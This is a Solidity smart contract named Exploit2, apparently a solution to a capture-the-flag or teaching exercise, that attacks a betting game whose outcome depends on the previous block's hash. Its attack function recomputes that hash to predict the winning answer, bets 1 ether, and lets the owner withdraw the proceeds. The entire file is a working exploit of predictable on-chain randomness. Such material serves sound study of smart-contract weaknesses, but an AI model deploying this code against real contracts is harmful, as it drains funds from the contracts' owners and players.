pragma solidity ^0.8.13;

interface IGame {
    function play(bool) external payable;
}

contract Exploit2 {
    address immutable game;
    address immutable owner;

    constructor(address gameAddr) {
        game = gameAddr;
        owner = msg.sender;
    }

    function attack() external payable {
        IGame gameContract = IGame(game);

        uint256 value = uint256(blockhash(block.number - 1));
        uint256 random = value % 2;
        bool answer = random == 1 ? true : false;

        gameContract.play{value: 1 ether}(answer);
    }

    function withdraw() public OnlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "Nothing to withdraw; contract balance empty");

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}

    fallback() external payable {}

    modifier OnlyOwner() {
        require(msg.sender == owner);
        _;
    }
}
